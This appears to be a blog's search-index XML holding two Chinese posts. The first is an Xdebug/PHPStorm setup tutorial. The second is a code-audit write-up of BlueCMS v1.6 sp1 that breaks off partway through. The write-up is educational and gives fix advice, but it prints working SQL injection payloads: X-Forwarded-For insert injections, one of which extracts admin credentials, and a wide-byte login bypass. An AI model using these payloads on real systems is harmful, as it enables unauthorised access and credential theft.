<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHPStorm+PHPStudy+Xdebug 配置2020详细教程</title>
    <url>/archives/9041ce26.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学代码审计的时候看师傅们说 PHPStorm + XDebug 是审计利器，也想配置看看，奈何网上一些博客要不就是太远古对不上号，要不就是写得不明不白，一怒之下自己摸索成功，记录下方便以后发病重装。</p>
<p>先说明我的配置：</p>
<ul>
<li>PHPStrom 2020.2.3</li>
<li>PHPStudy 8.1.1.2</li>
<li>Win 10</li>
</ul>
<p>不保证本教程对其他版本应用适用，但希望能帮助到你。</p>
<a id="more"></a>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="PHPStudy-配置"><a href="#PHPStudy-配置" class="headerlink" title="PHPStudy 配置"></a>PHPStudy 配置</h2><p>以配置 BlueCMS 为例，因其安装要创建数据库，我这里是创建了一个新网站：</p>
<p><img src="https://i.loli.net/2020/11/29/jyagYCQhmBt3W61.png" style="zoom:80%;" /></p>
<p>注意 PHP 版本，这些古早 CMS 不用 PHP 5.x 基本完蛋。</p>
<h2 id="XDebug-配置"><a href="#XDebug-配置" class="headerlink" title="XDebug 配置"></a>XDebug 配置</h2><p>网上的教程都说去官网下 XDebug ，还要啥对照 PHP 版本，我安了四次改了两次 PHP 版本都不对，差点肺都气炸，自己看目录，其实人 PHPStudy 早就自带了。</p>
<p>在你需要的 PHP 版本 Extensions 目录中的 php.ini 添加如下内容：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">;这里修改成你的目录（绝对路径）下的 php_xdebug.dll 的路径</span><br><span class="line">zend_extension &#x3D; &quot;phpstudy_pro\Extensions\php\php5.4.45nts\ext\php_xdebug.dll&quot;</span><br><span class="line"> </span><br><span class="line">xdebug.remote_enable &#x3D; On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable &#x3D; On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace&#x3D;On</span><br><span class="line">xdebug.profiler_enable_trigger &#x3D; On</span><br><span class="line">xdebug.profiler_output_name &#x3D; cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line">;这里修改成你的指定性能分析文件的存放目录</span><br><span class="line">xdebug.profiler_output_dir &#x3D;&quot;F:\debug&quot;</span><br><span class="line">xdebug.show_local_vars&#x3D;0</span><br><span class="line">xdebug.idekey&#x3D;&quot;PHPSTORM&quot;</span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port&#x3D;9000</span><br><span class="line">xdebug.remote_host&#x3D;&quot;localhost&quot;</span><br></pre></td></tr></table></figure>
<p>有两处要修改的地方注意一下。</p>
<p>修改后，可以在 WWW 目录下写个 <code>phpinfo()</code>  看下有没有 XDebug 的配置信息，如下图所示：</p>
<p><img src="https://i.loli.net/2020/11/29/m6AsGHX4xpqwaik.png" style="zoom:80%;" /></p>
<h2 id="PHPStorm-配置"><a href="#PHPStorm-配置" class="headerlink" title="PHPStorm 配置"></a>PHPStorm 配置</h2><p>首先是项目 PHP 语言版本的设置，改成你上述配置中使用的版本：</p>
<p><img src="https://i.loli.net/2020/11/29/FgvOpGLyxcwBIdW.png" style="zoom:80%;" /></p>
<p>第二配置 Debug ，第一个红框不一定要改成一样的。</p>
<p><img src="https://i.loli.net/2020/11/29/XiEM1rKewkODQIm.png" style="zoom:80%;" /></p>
<p>第三改 Servers ，Name 自定义。</p>
<p><img src="https://i.loli.net/2020/11/29/VE39xHnFcdrwq5g.png" style="zoom:80%;" /></p>
<p>然后就是 IDE 右上角的 Configuration ，这里我是已经配置好了，本来是默认不亮的。</p>
<p><img src="C:\Users\landv\AppData\Roaming\Typora\typora-user-images\image-20201129205918486.png" alt="image-20201129205918486" style="zoom:80%;" /></p>
<p>其中框框点 Edit Configurations ，配置如下：</p>
<p><img src="https://i.loli.net/2020/11/29/CQohAsbYMSpy7WX.png" style="zoom:80%;" /></p>
<p>首先点 + ，添加 PHP Web Page 修改右边的信息，Server Name 替换你上面自定义的名称，Start URL 看你 PHPStudy WWW 目录下想要调试的项目位置。</p>
<h2 id="浏览器配置"><a href="#浏览器配置" class="headerlink" title="浏览器配置"></a>浏览器配置</h2><p>我是用的 Edge ，Chrome 也有的插件 Xdebug helper ，扩展选项配置如下：</p>
<p><img src="https://i.loli.net/2020/11/29/TXxdNuJzOSc1IPE.png" style="zoom:67%;" /></p>
<p>火狐用户自行摸索，应该也有相关插件。</p>
<h2 id="开始第一次-Debug"><a href="#开始第一次-Debug" class="headerlink" title="开始第一次 Debug"></a>开始第一次 Debug</h2><p>配置好后，我们先点击 IDE 右上角的小电话，再点虫子：</p>
<p><img src="https://i.loli.net/2020/11/29/QPA4iHoglBshWxV.png" style="zoom:80%;" /></p>
<p>然后会自动启动浏览器访问上面填写的 Start URL ，我们在对应页面把 Xdebug helper 改成 Debug 模式：</p>
<p><img src="https://i.loli.net/2020/11/29/P9cxlDqQC2jLMRA.png" style="zoom:80%;" /></p>
<p>然后就可以快乐（秃头）了：</p>
<p><img src="https://i.loli.net/2020/11/29/VMhv6l9FAzxbaHL.png" style="zoom:80%;" /></p>
<p>当然你得先设置好断点，这个应该是每个 C 初学者早就会了的事，就不赘述了 :-) </p>
]]></content>
      <categories>
        <category>安装</category>
      </categories>
      <tags>
        <tag>配置</tag>
      </tags>
  </entry>
  <entry>
    <title>每周审计之BlueCMS v1.6 sp1复现</title>
    <url>/archives/ebbdc35f.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在根据 p 牛的 PHP 审计脑图学习审计，就打算找一些古早 CMS 来练习，因为课业繁忙，所以打算出《每周审计》这样一个栏目，每周审计一个 CMS ，既是督促自己学习，也是让自己能够有所沉淀。</p>
<p>本篇采用白盒的审计方式，会利用 Seay 一步到位，并给出相关修复建议，希望对初学的你有所帮助。</p>
<p>另外因 CMS 太过古老，搭建中可能会有许多问题（好与不好非常玄学），本身源码可能就有许多 bug ，建议调试修改，如果不行，建议直接放弃看漏洞部分。</p>
<a id="more"></a>
<p>环境搭建：</p>
<ul>
<li><a href="https://jwt1399.lanzous.com/inPwSde6c5a">Bluecms v1.6 sp1 源码</a></li>
<li><a href="https://github.com/f1tz/cnseay">Seay 源代码审计系统</a></li>
<li>PHPStudy php 5.4.45 nts</li>
</ul>
<p>行文如有不当，还请评论指正，谢谢！</p>
<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>获取到源码首先要考虑重装问题。</p>
<p>uploads/install/index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> define(<span class="string">&#x27;IN_BLUE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"> <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 生成 install.lock 文件</span></span><br><span class="line"> <span class="keyword">if</span>(file_exists(BLUE_ROOT.<span class="string">&#x27;data/install.lock&#x27;</span>))&#123;</span><br><span class="line"> 	install_showmsg(<span class="string">&#x27;您已经安装过本系统，如果想重新安装，请删除data目录下install.lock文件&#x27;</span>, <span class="string">&#x27;../index.php&#x27;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>对 data 目录下是否有 install.lock 文件进行了检测。</p>
<p>uploads/install/include/common.fun.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install_showmsg</span>(<span class="params">$msg,$gourl=<span class="string">&#x27;goback&#x27;</span>, $is_write = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line"> 	<span class="keyword">global</span> $install_smarty;</span><br><span class="line"> 	$install_smarty-&gt;assign(<span class="string">&quot;msg&quot;</span>,$msg);</span><br><span class="line"> 	$install_smarty-&gt;assign(<span class="string">&quot;gourl&quot;</span>,$gourl);</span><br><span class="line"> 	$install_smarty-&gt;display(<span class="string">&quot;showmsg.htm&quot;</span>);</span><br><span class="line"> 	<span class="keyword">exit</span>();</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>这里有 <code>exit()</code> 并无重装漏洞。</p>
<p>安装后，我们先随便注册一个用户账号，然后访问 uploads/admin ，用之前安装时管理员账密登录，把一些比如新闻栏目之类的添加好（默认空），方便我们进行测试。</p>
<p>再列出整个 CMS 的功能板块，括号内是自觉有测试价值的部分：</p>
<p><img src="https://i.loli.net/2020/12/01/HTVo5irclCW8pne.png" style="zoom:150%;" /></p>
<p>接下来用 Seay 自动化审计一遍。</p>
<p><img src="https://i.loli.net/2020/11/30/VycfaYNiSoeATx1.png" style="zoom:80%;" /></p>
<p>首先来分析其中的 SQL注入漏洞。</p>
<h2 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h2><p>因有些 SQL 语句拼接前根本没有过滤，所以部分只演示爆库过程，其余爆表列可自行修改对应语句，另外因为代码注入漏洞实在太多了（毕竟是 2010 年的），这里只给出部分样例。</p>
<h3 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h3><h4 id="普通-SQL-注入"><a href="#普通-SQL-注入" class="headerlink" title="普通 SQL 注入"></a>普通 SQL 注入</h4><p>uploads/ad_js.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$ad = $db-&gt;getone(<span class="string">&quot;SELECT * FROM &quot;</span>.table(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.$ad_id);</span><br></pre></td></tr></table></figure>
<p><code>ad_id</code> 只去除了两侧的空白字符。</p>
<p>uploads/include/mysql.class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params">$sql, $type=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line">    	$query = <span class="keyword">$this</span>-&gt;query($sql,<span class="keyword">$this</span>-&gt;linkid);</span><br><span class="line">    	$row = mysql_fetch_array($query, $type);</span><br><span class="line">    	<span class="keyword">return</span> $row;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>getone</code> 查询数组返回。</p>
<p>几乎是没有过滤，只不过页面回显在源码中，可以改成下面这样方便观察：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ad_content = str_replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\&quot;&#x27;</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\\r&quot;</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;\\n&quot;</span>,$ad_content);</span><br><span class="line">[-] <span class="keyword">echo</span> <span class="string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.$ad_content.<span class="string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;</span><br><span class="line">[+] <span class="keyword">echo</span> $ad_content;</span><br></pre></td></tr></table></figure>
<p>简单联合注入就能拿到管理员账密，密码是 md5 加密的，somd5 网站解密就行。</p>
<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[-] $ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? trim($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">[+] $ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) ? intval($_GET[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p><code>intval</code> 获取变量的整数值，这样就无法把其他特殊字符输入了。</p>
<h4 id="XFF-注入"><a href="#XFF-注入" class="headerlink" title="XFF 注入"></a>XFF 注入</h4><p><img src="https://i.loli.net/2020/12/01/uvxFPYiVhtDCELw.png" alt=""></p>
<p>漏洞成因主要是 uploads/include/common.fun.php 中的 <code>getip()</code> 这个方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getip</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 可以伪造 ip</span></span><br><span class="line">	<span class="keyword">if</span> (getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) </span><br><span class="line">	&#123; <span class="comment">//获取客户端用代理服务器访问时的真实ip 地址</span></span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) </span><br><span class="line">	&#123; </span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_X_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">elseif</span> (getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		$ip = getenv(<span class="string">&#x27;HTTP_FORWARDED&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123; </span><br><span class="line">		$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CLIENT_IP</code>、<code>X_FORWARDED_FOR</code> 都可以被伪造，我们全局搜索项目中有用到 <code>getip()</code> 的部分，看是否有利用之处：</p>
<p><img src="https://i.loli.net/2020/12/01/wLtlq2PzQ5hkrg8.png" style="zoom:80%;" /></p>
<p>uploads/comment.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;comment&#x27;</span>).<span class="string">&quot; (com_id, post_id, user_id, type, mood, content, pub_date, ip, is_check) </span></span><br><span class="line"><span class="string"> 			VALUES (&#x27;&#x27;, &#x27;<span class="subst">$id</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$type</span>&#x27;, &#x27;<span class="subst">$mood</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;&quot;</span>.getip().<span class="string">&quot;&#x27;, &#x27;<span class="subst">$is_check</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>第三处的 <code>online_ip</code> 被用在 uploads/guest_book.php 中：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span> . table(<span class="string">&#x27;guest_book&#x27;</span>) . <span class="string">&quot; (id, rid, user_id, add_time, ip, content) </span></span><br><span class="line"><span class="string">			VALUES (&#x27;&#x27;, &#x27;<span class="subst">$rid</span>&#x27;, &#x27;<span class="subst">$user_id</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$online_ip</span>&#x27;, &#x27;<span class="subst">$content</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>都是 insert 注入，这里以 guest_book 页面（即留言板）注入为演示，另外一例同理，因为 <code>online_ip</code> 正好是倒数第二个参数，最后的参数修改为我们需要查询的语句，再括号闭合注释掉后面的 <code>content</code> ：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1&#39;,database());-- +</span><br></pre></td></tr></table></figure>
<p>拼接效果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_guest_book (<span class="keyword">id</span>, rid, user_id, add_time, ip, <span class="keyword">content</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;$rid&#x27;</span>, <span class="string">&#x27;$user_id&#x27;</span>, <span class="string">&#x27;$timestamp&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="keyword">database</span>());</span><br><span class="line"><span class="comment">-- +, &#x27;$content&#x27;)&quot;;</span></span><br></pre></td></tr></table></figure>
<p>这里不知道为什么总是提示留言为空，可以直接把代码中的提示信息注释掉。</p>
<p><img src="https://i.loli.net/2020/12/01/oswrzHi4fQ7I5Je.png" style="zoom:80%;"  /></p>
<p><img src="https://i.loli.net/2020/12/01/Nxcqf3ZKeLRvkQb.png" style="zoom:80%;" /></p>
<p>另外还有 payload 我觉得可以学习一下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1&#39;, &#39;123&#39;),(&#39;&#39;,&#39;1&#39;,&#39;0&#39;,&#39;1&#39;,&#39;6&#39;,(select concat(&#39;&lt;u-&#39;,admin_name,&#39;-u&gt;&lt;p-&#39;,pwd,&#39;-p&gt;&#39;) from blue_admin), &#39;1281181973&#39;,&#39;99</span><br></pre></td></tr></table></figure>
<p>是对 comment.php 的注入，拼接效果：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> blue_comment (com_id, post_id, user_id, <span class="keyword">type</span>, mood, <span class="keyword">content</span>, pub_date, ip, is_check) <span class="keyword">VALUES</span> (<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;$id&#x27;</span>, <span class="string">&#x27;$user_id&#x27;</span>, <span class="string">&#x27;$type&#x27;</span>, <span class="string">&#x27;$mood&#x27;</span>, <span class="string">&#x27;$content&#x27;</span>, <span class="string">&#x27;$timestamp&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>),(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">&#x27;&lt;u-&#x27;</span>,admin_name,<span class="string">&#x27;-u&gt;&lt;p-&#x27;</span>,pwd,<span class="string">&#x27;-p&gt;&#x27;</span>) <span class="keyword">from</span> blue_admin), <span class="string">&#x27;1281181973&#x27;</span>,<span class="string">&#x27;99&#x27;</span>,$is_check<span class="string">&#x27;)&quot;;</span></span><br></pre></td></tr></table></figure>
<p>是插入了两条数据，只不过相比起第一种还是有些麻烦。</p>
<h5 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h5><p>过滤 HTTP 头中的 X-FORWARDED-FOR、CLIENT-IP header 中的内容，不允许其插入敏感字符，过滤字符参考 SQL 注入修复方案。</p>
<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>因数据库编码是 GBK ，所以绝大可能存在宽字节注入，其他无过滤（甚至无单引号保护）的我们不需要考虑。只关注那些有用转义（即在字符串中的符号前加上 <code>\</code> ）的函数 <code>addslashes</code> 、<code>mysql_real_escape_string</code>、<code>mysql_escape_string</code> 等，还有一种情况是 <code>magic_quote_gpc</code> ，PHP 6 删除了这个选项，但我们是 PHP 5.x 。</p>
<p>uploads/admin/login.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$admin_name = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin_name&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;admin_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$admin_pwd = <span class="keyword">isset</span>($_POST[<span class="string">&#x27;admin_pwd&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;admin_pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span>(check_admin($admin_name, $admin_pwd))&#123;</span><br><span class="line"> 		update_admin_info($admin_name);</span><br><span class="line"> 		...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>上述文件包含的文件 uploads/admin/include/common.inc.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">	$_POST = deep_addslashes($_POST);</span><br><span class="line">	$_GET = deep_addslashes($_GET);</span><br><span class="line">	$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">	$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果 <code>magic_quotes_gpc</code> 为 OFF ，就采用下面的函数转义，可以看到超全局变量都用了这个函数，我们上面的账密参数就是。</p>
<p><code>deep_addslashes</code> 函数 uploads/include/common.fun.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(is_array($str))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>($str <span class="keyword">as</span> $key=&gt;$val)</span><br><span class="line">		&#123;</span><br><span class="line">			$str[$key] = deep_addslashes($val);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$str = addslashes($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简而言之，数据全部 <code>addslashes</code> 。</p>
<p>uploads/admin/include/common.fun.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_admin</span>(<span class="params">$name, $pwd</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $db;</span><br><span class="line">	$row = $db-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$name</span>&#x27; and pwd = md5(&#x27;<span class="subst">$pwd</span>&#x27;)&quot;</span>);</span><br><span class="line"> 	<span class="keyword">if</span>($row[<span class="string">&#x27;num&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="keyword">else</span></span><br><span class="line"> 	&#123;</span><br><span class="line"> 		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pwd</code> 需要 md5 加密，我们选择 <code>admin_name</code> 这个参数进行注入测试万能密码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin_name&#x3D;landv%df&#39; or 1&#x3D;1#&amp;admin_pwd&#x3D;123</span><br></pre></td></tr></table></figure>
<p>拼接效果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="keyword">num</span> <span class="keyword">FROM</span> blue_admin <span class="keyword">WHERE</span> admin_name=<span class="string">&#x27;landv%df\&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line"><span class="comment">#&#x27; and pwd = md5(&#x27;123&#x27;)</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/12/01/N9CYy3cStbmvAnz.png" alt=""></p>
<p>同理，uploads/user.php 用户登录界面也存在这样的问题（包含了相同的函数文件）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user_name  	= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;user_name&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;user_name&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$pwd 			= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;pwd&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;pwd&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$row = $db-&gt;getone(<span class="string">&quot;SELECT COUNT(*) AS num FROM &quot;</span>.table(<span class="string">&#x27;admin&#x27;</span>).<span class="string">&quot; WHERE admin_name=&#x27;<span class="subst">$user_name</span>&#x27;&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>区别是有验证码，但也就只限制了批量登录。</p>
<p><img src="https://i.loli.net/2020/12/01/e5AFaoGId1iPMV2.png" style="zoom:80%;" /></p>
<p>这里因为 admin 是 user 表的第一条数据，我们可以调整 <code>1=1</code> 的数值登录所有用户。</p>
<p>用户注册界面同样能行，但用户名有长度限制 4~16：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($user_name) &lt; <span class="number">4</span> || strlen($user_name) &gt; <span class="number">16</span>)&#123;</span><br><span class="line">	showmsg(<span class="string">&#x27;用户名字符长度不符&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但邮箱可以利用：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$email     		= 	!<span class="keyword">empty</span>($_POST[<span class="string">&#x27;email&#x27;</span>]) ? trim($_POST[<span class="string">&#x27;email&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br><span class="line">$sql = <span class="string">&quot;INSERT INTO &quot;</span>.table(<span class="string">&#x27;user&#x27;</span>).<span class="string">&quot; (user_id, user_name, pwd, email, reg_time, last_login_time) VALUES (&#x27;&#x27;, &#x27;<span class="subst">$user_name</span>&#x27;, md5(&#x27;<span class="subst">$pwd</span>&#x27;), &#x27;<span class="subst">$email</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;, &#x27;<span class="subst">$timestamp</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>insert 注入可以参考上面的 XFF 注入 payload，这里是宽字节，可以尝试 insert 插入两条数据。</p>
<h5 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h5><p>对于宽字节编码，有一种最好的修补就是：</p>
<ul>
<li><p>使用 <code>mysql_set_charset</code> (GBK) 指定字符集</p>
</li>
<li><p>使用 <code>mysql_real_escape_string</code> 进行转义</p>
</li>
</ul>
<p>原理是，<code>mysql_real_escape_string</code> 与 <code>addslashes</code> 的不同之处在于其会考虑当前设置的字符集，不会出现前面 e5 和5c 拼接为一个宽字节的问题，但是这个“当前字符集”如何确定呢？</p>
<p>就是使用 <code>mysql_set_charset</code> 进行指定。</p>
<p>上述的两个条件是“与”运算的关系，少一条都不行。</p>
<h3 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h3><h4 id="普通-SQL-注入漏洞"><a href="#普通-SQL-注入漏洞" class="headerlink" title="普通 SQL 注入漏洞"></a>普通 SQL 注入漏洞</h4><p>从最开始的功能板块图就能看出来，添加数据的功能有很多，但有没有对数据消毒就是另一回事了。</p>
<p>uploads/admin/nav.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($act==<span class="string">&#x27;edit&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$sql = <span class="string">&quot;select * from &quot;</span>.table(<span class="string">&#x27;navigate&#x27;</span>).<span class="string">&quot; where navid = &quot;</span>.$_GET[<span class="string">&#x27;navid&#x27;</span>];</span><br><span class="line">	$nav = $db-&gt;getone($sql);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">&#x27;nav&#x27;</span>,$nav);</span><br><span class="line">	$smarty-&gt;assign(<span class="string">&#x27;act&#x27;</span>, $act	);</span><br><span class="line">	$smarty-&gt;display(<span class="string">&#x27;nav_info.htm&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接拼接 <code>$_GET[&#39;navid&#39;]</code> </p>
<p>uploads/admin/attachment.php</p>
